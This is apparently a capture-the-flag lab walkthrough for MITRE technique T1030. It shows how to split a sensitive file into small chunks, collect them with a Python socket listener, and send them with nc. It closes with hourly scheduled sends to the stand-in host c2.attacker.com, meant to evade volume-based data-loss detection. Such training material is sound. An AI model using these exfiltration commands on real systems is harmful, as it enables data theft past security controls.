# T1030 – Data Transfer Size Limits | Solution Walkthrough
**Difficulty:** Intermediate | **OS:** Linux | **MITRE:** T1030

## Step 1 – Check File Size
```bash
ls -lh /opt/sensitive-data/large_dataset.txt
# ~40KB — exceeds "DLP limit" of 10KB per transfer
wc -l /opt/sensitive-data/large_dataset.txt
```

## Step 2 – Start Chunked Receiver
```bash
# Simple receiver that accumulates chunks:
mkdir -p /tmp/received
python3 -c "
import socket, os
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 6666)); s.listen(100)
print('[*] Listening on 6666...')
chunk_num = 0
while True:
    conn, addr = s.accept()
    data = b''
    while True:
        d = conn.recv(4096)
        if not d: break
        data += d
    conn.close()
    fname = f'/tmp/received/chunk_{chunk_num:04d}'
    open(fname,'wb').write(data)
    print(f'[+] Chunk {chunk_num}: {len(data)} bytes → {fname}')
    chunk_num += 1
" &
```

## Step 3 – Split and Send Chunks
```bash
# Split into 5KB chunks:
split -b 5000 /opt/sensitive-data/large_dataset.txt /tmp/chunk_

# Send each chunk separately:
for chunk in /tmp/chunk_*; do
    echo "[*] Sending $chunk ($(wc -c < $chunk) bytes)..."
    nc -q1 localhost 6666 < "$chunk"
    sleep 0.5  # Delay between chunks to avoid rate limiting
done
```

## Step 4 – Reassemble at C2
```bash
cat /tmp/received/chunk_* > /tmp/reconstructed.txt
head -1 /tmp/reconstructed.txt
# HACKTIFY{CHUNKED_TRANSFER_<hash>}
diff /opt/sensitive-data/large_dataset.txt /tmp/reconstructed.txt
# No differences — perfect reconstruction!
```

## Step 5 – Time-based Chunking (Slower = Stealthier)
```bash
# Send one chunk per hour (very hard to detect with volume-based DLP):
i=0
for chunk in /tmp/chunk_*; do
    at "now + $((i*60)) minutes" <<< "nc -q1 c2.attacker.com 6666 < $chunk"
    ((i++))
done
```
